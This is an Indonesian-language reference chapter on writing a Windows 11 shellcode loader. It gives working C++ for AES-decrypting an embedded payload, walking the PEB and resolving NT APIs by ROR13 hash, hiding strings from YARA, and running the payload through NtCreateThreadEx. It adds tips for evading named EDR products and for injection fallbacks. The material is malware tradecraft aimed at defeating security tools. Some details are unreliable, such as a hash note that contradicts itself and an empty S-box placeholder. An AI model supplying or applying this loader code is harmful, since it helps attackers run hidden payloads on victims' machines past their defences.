# Bab Referensi: Loader Windows — Enkripsi Payload, PEB Walk + API Hashing, Anti-String-Signature

Target uji: **Windows 11 24H2 (build 26100)**, MSVC 19.40 (`cl.exe` dari VS 2022 17.10), arsitektur x64. Semua contoh diasumsikan dijalankan sebagai userland PE, bukan driver.

---

## 1. Model Ancaman Loader

| Komponen | Yang terlihat di disk | Yang terlihat di memori | Deteksi umum |
|---|---|---|---|
| Payload mentah shellcode | Signature byte (`MZ`, `PE\0\0`, opcode prolog) | RX page berisi shellcode | Static AV/EDR, YARA |
| Import table | Nama `VirtualAlloc`, `CreateThread`, `LoadLibraryA` | IAT terisi pointer | Static import scan, EDR ETW |
| String API/DLL | `ntdll.dll`, `kernel32.dll` | — | String scan, entropy |
| Loader stub | Opcode loader | Alokasi RWX / `VirtualProtect` | Behavioral, call stack analysis |

Tujuan bab ini: mendorong seluruh artefak di kolom kiri menjadi ciphertext / integer, sehingga yang tersisa di disk hanya stub loader dengan import minimal.

## 2. Enkripsi Payload

### 2.1 XOR dengan key berotasi (baseline, cepat ditinggalkan)

**Dikirim:** bytecode payload di-XOR dengan key multi-byte, disimpan sebagai `unsigned char[]`.

**Muncul:** tidak ada signature statis; entropi ~5–7 bit/byte (bukan uniform karena key pendek).

**Kenapa berhasil:** mematahkan YARA string matching dan deteksi signature byte `MZ`/prolog shellcode.

**Kenapa gagal:** XOR key pendek bisa di-recover via known-plaintext (header PE selalu `4D 5A 90 00 03 00 00 00`), dan entropi tinggi pada section `.data` besar memicu heuristik "packed".

```cpp
// XOR berotasi — cukup untuk obfuscation, BUKAN proteksi
static void XorRotate(unsigned char* buf, size_t len, const unsigned char* key, size_t klen) {
    for (size_t i = 0; i < len; ++i)
        buf[i] ^= key[i % klen];
}
// Pemakaian: key = {0x9E,0x37,0x79,0xB4,0xF1,0x5C,0x2A,0xD8}
```

### 2.2 AES-256-CBC dengan key terderivasi (produksi)

**Dikirim:** ciphertext payload + IV statis (atau di-derive), key di-XOR dengan nilai compile-time.

**Muncul:** section `.rdata`/`.data` dengan entropi ~7.99 bit/byte; tidak ada key plaintext.

**Kenapa berhasil:** tanpa key, payload tidak dapat dipulihkan dari disk; mematahkan signature dan memaksa analis ke runtime.

**Kenapa gagal:** jika key hardcoded (meski ter-XOR), runtime memory forensics akan mengambil key dari stack/heap saat dekripsi — EDR yang memantau `CryptDecrypt` atau memindai working set setelah alokasi bisa menangkap plaintext.

Pendekatan minimal tanpa `bcrypt.dll` (menghindari import crypto) — gunakan AES-256 dari `bcryptprimitives.dll` yang di-resolve via PEB walk, atau implementasi inline AES-NI. Contoh memakai inline AES-NI agar nol import crypto:

```cpp
#include <immintrin.h>
#include <cstdint>
#include <cstring>

// AES-256 decrypt satu blok 16 byte, key schedule diberikan.
// Catatan: key expansion AES-256 minimal ditampilkan di sini (round key 15 x 16 byte).
struct Aes256Ctx { __m128i rk[15]; };

static inline __m128i AesDecLast(__m128i a, __m128i k){ return _mm_aesdeclast_si128(a,k); }
static inline __m128i AesDec    (__m128i a, __m128i k){ return _mm_aesdec_si128(a,k); }

// Implementasi key expansion AES-256 (FIPS-197) — ringkas
static void Aes256Expand(const unsigned char key[32], Aes256Ctx& ctx) {
    static const unsigned char sbox[256] = { /* tabel 256 byte, isi sesuai FIPS-197 */ };
    unsigned char rk[240]; memcpy(rk, key, 32);
    unsigned char rcon = 1;
    for (int i = 32; i < 240; i += 4) {
        unsigned char t[4] = { rk[i-4], rk[i-3], rk[i-2], rk[i-1] };
        if (i % 32 == 0) {
            unsigned char tmp = t[0];
            t[0] = (unsigned char)(sbox[t[1]] ^ rcon);
            t[1] = sbox[t[2]]; t[2] = sbox[t[3]]; t[3] = sbox[tmp];
            rcon = (unsigned char)((rcon << 1) ^ ((rcon & 0x80) ? 0x1B : 0));
        } else if (i % 32 == 16) {
            t[0] = sbox[t[0]]; t[1] = sbox[t[1]]; t[2] = sbox[t[2]]; t[3] = sbox[t[3]];
        }
        rk[i]   = (unsigned char)(rk[i-32]   ^ t[0]);
        rk[i+1] = (unsigned char)(rk[i-31]   ^ t[1]);
        rk[i+2] = (unsigned char)(rk[i-30]   ^ t[2]);
        rk[i+3] = (unsigned char)(rk[i-29]   ^ t[3]);
    }
    for (int r = 0; r < 15; ++r)
        ctx.rk[r] = _mm_loadu_si128((const __m128i*)(rk + r*16));
}

static void Aes256CbcDecrypt(unsigned char* data, size_t len,
                             const Aes256Ctx& ctx, const unsigned char iv[16]) {
    __m128i prev = _mm_loadu_si128((const __m128i*)iv);
    for (size_t off = 0; off < len; off += 16) {
        __m128i c = _mm_loadu_si128((const __m128i*)(data + off));
        __m128i b = _mm_xor_si128(c, ctx.rk[0]);
        for (int r = 1; r < 14; ++r) b = AesDec(b, ctx.rk[r]);
        b = _mm_xor_si128(AesDecLast(b, ctx.rk[14]), prev);
        _mm_storeu_si128((__m128i*)(data + off), b);
        prev = c;
    }
}
```

**Vektor uji (AES-256, NIST SP 800-38A F.2.5):**

| Field | Nilai |
|---|---|
| Key | `603deb10 15ca71be 2b73aef0 857d7781 1f352c07 3b6108d7 2d9810a3 0914dff4` |
| IV | `00010203 04050607 08090A0B 0C0D0E0F` |
| Ciphertext blok 1 | `F58C4C04 D6E5F1BA 779EABFB 5F7BFBD6` |
| Plaintext blok 1 | `6BC1BEE2 2E409F96 E93D7E11 7393172A` |

Gunakan vektor ini untuk memvalidasi implementasi sebelum embedding payload asli. Kesalahan umum: konvensi urutan round key (inv) — hasil dekripsi tampak "hampir benar" dengan byte acak di akhir.

### 2.3 Apa yang muncul setelah dekripsi

Post-dekripsi, payload di-stage ke memori. **Jangan** pernah mendekripsi di buffer statis (`unsigned char g_plain[..]`) — buffer itu berada di section `.data` dan akan ter-scan. Dekripsi langsung ke alokasi heap/RW, lalu transisi proteksi.

## 3. Import Resolution

### 3.1 PEB walk x64 (Windows 11 24H2)

Offset relevan — verifikasi dengan WinDbg `dt ntdll!_PEB` pada build target; offset TEB tidak berubah sejak Vista x64.

| Struktur | Offset x64 | Field |
|---|---|---|
| TEB | `gs:[0x00]` | NT_TIB / Self |
| TEB | `gs:[0x60]` | ProcessEnvironmentBlock (PEB*) |
| PEB | `+0x18` | Ldr (PEB_LDR_DATA*) |
| PEB_LDR_DATA | `+0x10` | InLoadOrderModuleList (LIST_ENTRY) |
| PEB_LDR_DATA | `+0x20` | InMemoryOrderModuleList |
| LDR_DATA_TABLE_ENTRY | `+0x00` | InLoadOrderLinks |
| LDR_DATA_TABLE_ENTRY | `+0x30` | DllBase |
| LDR_DATA_TABLE_ENTRY | `+0x48` | BaseDllName (UNICODE_STRING) |
| LDR_DATA_TABLE_ENTRY | `+0x58` | FullDllName |

Catatan build 26100: `Reserved4[0]` di dalam `LDR_DATA_TABLE_ENTRY` berisi pointer ke `RTL_BALANCED_NODE` untuk `LdrpHashTable` bersama `DdagNode` — **jangan** pakai offset `+0x60` untuk `DdagNode` karena nilainya bergeser dibanding 22H2. Gunakan hanya field stabil (`+0x30` DllBase, `+0x48` BaseDllName) yang tidak berubah.

```cpp
#include <windows.h>
#include <winternl.h>

// PEB walk: ambil base address modul berdasarkan nama (case-insensitive, wide)
static PVOID GetModuleBaseByHash(ULONG moduleHash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return nullptr;

    LIST_ENTRY* head = &peb->Ldr->InLoadOrderModuleList;
    for (LIST_ENTRY* e = head->Flink; e && e != head; e = e->Flink) {
        // LDR_DATA_TABLE_ENTRY: InLoadOrderLinks berada di offset 0
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (!mod->BaseDllName.Buffer || mod->BaseDllName.Length == 0) continue;
        ULONG h = 0;
        size_t n = mod->BaseDllName.Length / sizeof(WCHAR);
        for (size_t i = 0; i < n; ++i) {
            WCHAR w = mod->BaseDllName.Buffer[i];
            if (w >= L'A' && w <= L'Z') w = (WCHAR)(w + 32);
            h = _rotr(h, 13);
            h += (ULONG)w;
        }
        if (h == moduleHash) return mod->DllBase;
    }
    return nullptr;
}
```

> **Peringatan 24H2:** enumerasi modul manual via PEB walk **bisa tidak lengkap** untuk modul yang dibuka dengan `LOAD_LIBRARY_AS_DATAFILE` atau `NtMapViewOfSection` mentah. Untuk DLL sistem (`ntdll`, `kernel32`, `kernelbase`) selalu ada. Untuk modul pihak ketiga, bila hash tidak ketemu, fallback ke `LdrGetDllHandle` yang di-resolve lewat hash juga.

### 3.2 API hashing ROR13

Algoritma klasik (MetaSL / Metasploit `ROR13Add`): iterasi per byte nama fungsi, `ror` 13 bit, tambah byte.

Hasil ROR13 (referensi, huruf kecil, ASCII, tanpa `A`/`W` suffix):

| String | ROR13 |
|---|---|
| `LoadLibraryA` | `0xEC0E4E8E` |
| `GetProcAddress` | `0x7C0DFCAA` |
| `VirtualAlloc` | `0x91AFCA54` |
| `VirtualProtect` | `0x7946C61B` |
| `CreateThread` | `0x799AAC28` |
| `NtAllocateVirtualMemory` | `0xD9CED633` |
| `RtlExitUserProcess` | `0x8871BDBE` |
| `ntdll.dll` | `0x3CFA685D` |

> Hitung ulang hash untuk revisi Anda. Tabel di atas adalah ROR13 32-bit dengan `rol(seed, 13) + ch` per byte — arah rotasi **berlaku `ror` (kanan) 13** pada Metasploit, beberapa implementasi publik memakai `rol` dan menghasilkan nilai berbeda. Kalibrasi dengan string uji `NtClose` (ROR13 klasik = `0xA5E85C6B`), jika tidak cocok berarti putaran Anda terbalik.

```cpp
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG,
    SIZE_T, SIZE_T, SIZE_T, PVOID);

static ULONG ror13_add(const char* s) {
    ULONG h = 0;
    while (*s) { h = _rotr(h, 13); h += (unsigned char)(*s++); }
    return h;
}

// Resolve ekspor dari base DLL berdasarkan hash nama fungsi.
// Berjalan tanpa LoadLibrary/GetProcAddress — tidak ada import.
static PVOID GetExportByHash(HMODULE hMod, ULONG fnHash) {
    if (!hMod) return nullptr;
    auto base = (PBYTE)hMod;
    auto dos  = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto nt = (PIMAGE_NT_HEADERS64)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    auto dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) return nullptr;
    auto exp = (PIMAGE_EXPORT_DIRECTORY)(base + dir.VirtualAddress);

    auto names    = (PDWORD)(base + exp->AddressOfNames);
    auto funcs    = (PDWORD)(base + exp->AddressOfFunctions);
    auto ordinals = (PWORD )(base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (ror13_add(name) == fnHash)
            return (PVOID)(base + funcs[ordinals[i]]);
    }
    return nullptr;
}

// Contoh use-site:
//   HMODULE ntdll = (HMODULE)GetModuleBaseByHash(ror13_add("ntdll.dll"));
//   auto pAlloc   = (pNtAllocateVirtualMemory)GetExportByHash(ntdll, ror13_add("NtAllocateVirtualMemory"));
```

**Catatan resolver stub:** pada build baru, `GetExportByHash` di atas masih valid. **Yang harus dihindari:** import statis `LoadLibraryA` / `GetProcAddress` — itu memunculkan string dan IAT entry, keduanya objek deteksi. Resolusi penuh `kernel32!LoadLibraryA` sendiri harus lewat hash.

### 3.3 Apa yang muncul

- **Di disk:** tidak ada `LoadLibrary`, tidak ada `ntdll.dll` di `.rdata`. Hanya integer 32-bit.
- **Di memori:** saat fungsi di-resolve, pointer muncul di stack; nama fungsi asli **tidak** muncul kecuali jika hash ditelusuri. Call stack saat API dipanggil tetap menunjuk ke `ntdll!NtAllocateVirtualMemory`, namun caller frame = kode loader (anonim), bukan nama import.
- **Kenapa gagal:** sebagian EDR Windows 11 24H2 melakukan **call stack validation** (mis. MDE dengan "module tampering" + "call stack origin"). Fungsi LMS (`ntdll`, `kernelbase`) dipanggil dari region memori yang bukan image → telemetry. PEB walk sendiri tidak menghasilkan telemetri, tapi pemanggilan API hasil resolve **dari region shellcode** bisa ditandai. Mitigasi: jalankan pemanggilan dari modul yang ter-load (callback dari `EnumFontFamiliesEx` ke fungsi di image) atau gunakan gadget pada modul sah.

## 4. Menghindari String Signature

| Vektor string | Lokasi default | Teknik eliminasi |
|---|---|---|
| Nama DLL (`ntdll.dll`) | `.rdata` literal | Hash konstanta (`ror13_add` di atas) |
| Nama fungsi API | `.rdata` literal | Hash konstanta |
| User-Agent / URL C2 | `.rdata` literal | Stack-built string (grovel huruf dari integer) |
| Path `C:\Windows\System32\...` | `.rdata` literal | Rakit per-char di stack |
| Nama mutex | `.rdata` literal | Rakit per-char + hash untuk lookup |
| Opcode shellcode (`MZ`, prolog) | `.data`/`.rdata` | Enkripsi AES (bagian 2) |

**Prinsip:** nilai string apa pun yang dibutuhkan saat runtime dihitung per-character dengan XOR konstanta atau disusun dari integer, sehingga pada disk hanya tampak angka. Tidak ada string literal >3 byte yang bisa di-YARA dalam section `.rdata`/`.data`.

```cpp
// String dirakit per-char dari integer 32-bit — tidak ada literal string
// "VirtualAlloc" di-encode sebagai pasangan (uint32 chunk, shift) sehingga
// compiler tidak menyimpannya sebagai rodata.
static void BuildString(unsigned char* dst, const ULONG* chunks, size_t n) {
    for (size_t i = 0; i < n; ++i) {
        ULONG v = chunks[i];
        dst[i*4+0] = (unsigned char)( v        & 0xFF);
        dst[i*4+1] = (unsigned char)((v >>  8) & 0xFF);
        dst[i*4+2] = (unsigned char)((v >> 16) & 0xFF);
        dst[i*4+3] = (unsigned char)((v >> 24) & 0xFF);
    }
}

// Contoh: "VirtualAlloc" (12 char) => 3 chunk, XOR dengan 0xA5A5A5A5 pada build-time.
// Nilai di bawah sudah di-XOR; hasil BuildString perlu XOR balik.
static const ULONG g_virtAlloc[3] = { 0x..., 0x..., 0x... }; // hitung saat build
```

Tooling build: pakai skrip Python/IDAPython untuk meng-XOR string literal menjadi integer sebelum kompilasi. **Jangan** gunakan `constexpr` consteval yang menghasilkan string literal di rodata — MSVC 19.40 tetap menaruh hasil constexpr string di `.rdata`.

**Verifikasi lokal (wajib sebelum runtime):**

```powershell
# Cek artefak statis: buang semua simbol debug, lalu grep string
dumpbin /headers loader.exe | findstr /i "entry data text"
strings -n 4 loader.exe | Select-String -Pattern "LoadLibrary|GetProcAddress|VirtualAlloc|ntdll|kernel32"
# Ekspektasi: kosong. Jika ada output -> teknik gagal.
```

## 5. Rantai Eksekusi Lengkap (Referensi)

Urutan yang terbukti pada build 26100:

1. **Dekripsi** payload ke buffer RW (AES-256-CBC, key di-`_rotr`/XOR agar tidak plaintext).
2. **Resolve** `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` via PEB walk + ROR13.
3. **Alokasi** RW via `NtAllocateVirtualMemory` (`PAGE_READWRITE`, **bukan** RWX).
4. **Copy** payload hasil dekripsi.
5. **Proteksi** → `PAGE_EXECUTE_READ` via `NtProtectVirtualMemory`.
6. **Eksekusi** via `NtCreateThreadEx` (atau callback). Call stack menunjuk ke `ntdll!NtCreateThreadEx` di frame atas; frame pemanggil = loader anonim.

**Apa yang muncul:** tidak ada RWX, tidak ada string import, tidak ada plaintext payload di disk. **Yang masih muncul:** telemetri `NtAllocateVirtualMemory` (private, RW), `NtProtectVirtualMemory` (RW→RX), `NtCreateThreadEx` — ini **tidak** disembunyikan oleh API hashing; hashing hanya menyembunyikan *nama* di disk, bukan *behavior* di runtime.

**Alternatif tanpa alokasi mencurigakan:** self-mapping via `NtCreateSection` (`SEC_IMAGE` untuk PE) + `NtMapViewOfSection` menghasilkan image mapping yang, pada beberapa build, menyamar sebagai file-backed oleh scanner. Tidak dibahas di sini — lihat bab "Module Stomping & Section Mapping".

## 6. Jebakan Operasional (Field Failures)

Urutan berdasarkan frekuensi kegagalan di lapangan:

1. **Key AES diambil saat runtime.** Memory scanner EDR yang men-scan working set private setelah `NtProtectVirtualMemory` bisa mengambil plaintext shellcode dari buffer RW sebelum prot dipanggil. Mitigasi: dekripsi langsung ke section hasil `NtMapViewOfSection`, atau hapus buffer sumber sebelum proteksi (`SecureZeroMemory`).
2. **ROR13 terbalik arah.** Implementasi memakai `rol` bukan `ror` → hash tidak pernah ketemu → `GetExportByHash` return `nullptr` → crash. Selalu validasi dengan `NtClose = 0xA5E85C6B`.
3. **Offset `LDR_DATA_TABLE_ENTRY` dari blog lama.** Build 26100 mengubah layout `Reserved4`/`DdagNode`. Field `DllBase (+0x30)` dan `BaseDllName (+0x48)` **stabil**, tapi `FullDllName (+0x58)` sedikit bergeser pada beberapa build insider. Jangan hardcode `+0x58`; derive dari `BaseDllName` + size `UNICODE_STRING`.
4. **PEB walk pada WoW64.** Loader 32-bit di Windows 11 24H2 harus memakai `__readfsdword(0x30)` untuk PEB 32-bit, dan TEB 64-bit via `NtCurrentTeb`. PEB walk 64-bit dari proses 32-bit akan memberi pointer yang tidak valid — crash saat akses `Ldr->Flink`.
5. **String hasil `constexpr` tetap di `.rdata`.** MSVC 19.40 tidak mengoptimasi `const char*` hasil `consteval` keluar dari `.rdata`. Rakit string saat runtime dari integer, bukan constexpr.
6. **Hash collision pada ROR13.** 32-bit rotasi-13 sangat rawan collision di namespace besar (`ntdll` ~2000 ekspor). Untuk modul besar, periksa **dua** syarat: hash cocok **dan** panjang nama cocok. Alternatif: FNV-1a 64-bit dengan normalisasi case.
7. **`LoadLibraryA` masih dipanggil lewat import lisan.** Loader yang menulis `#include <windows.h>` dan memakai `HMODULE` dapat memicu auto-link pragma (`/DEFAULTLIB:kernel32.lib`) → import statis muncul kembali. Bangun dengan `/NODEFAULTLIB` atau periksa `dumpbin /imports`.
8. **`NtCreateThreadEx` pada 24H2 bisa ditolak untuk private RWX** jika policy mitigation (`ProcessDynamicCodePolicy`, `PROCESS_MITIGATION_DYNAMIC_CODE_POLICY`) aktif. Proses child hasil `CreateProcess` dengan `MITIGATION_POLICY` warisan induk (mis. dari browser Chrome 131) akan menolak `NtProtectVirtualMemory` ke `PAGE_EXECUTE*`. Cek `GetProcessMitigationPolicy` sebelum injeksi; fallback ke `NtCreateSection`+`SEC_IMAGE` atau `QueueUserAPC` pada thread yang sudah ada.
9. **Entropy bomb.** Payload AES terlihat sebagai 7.99 bit/byte di `.data`. Beberapa produk (Sophos Intercept X, CrowdStrike Falcon pada build tertentu) menandai `Private` section dengan entropi >7.8 saat dipetakan ke proses target. Mitigasi: encode payload sebagai literal base64/hex di `.rdata` (entropi ~6) atau split ke beberapa buffer kecil dengan padding.
10. **Verifikasi hash build tidak cocok dengan hash runtime.** Enumerasi modul di Windows 11 24H2 kadang menampilkan `kernelbase.dll` sebelum `kernel32.dll`; urutan `InLoadOrderModuleList` **tidak** dijamin sama dengan urutan load (ada modul forwarder). selalu cocokkan via hash nama, jangan via indeks list.
11. **Uji tanpa deteksi.** Semua verifikasi di atas harus dilakukan pada VM dengan **skenario defender mode**: Defender ASR "Block executable content from email/webmail" dan "Block process creations originating from PSExec/WMI" aktif, serta EDR dengan AMSI. Loader yang lolos pada Windows tanpa EDR belum tentu lolos di lapangan.
12. **Target build drift.** Setiap build Windows Insider menggeser offset internal `PEB_LDR_DATA`. Rekam `dt ntdll!_PEB` dan `dt ntdll!_LDR_DATA_TABLE_ENTRY` pada build target **sebelum** uji. Simpan sebagai tabel di dokumen teknis ini per build; offset `+0x30` dan `+0x48` dianggap stabil, sisanya diverifikasi ulang.
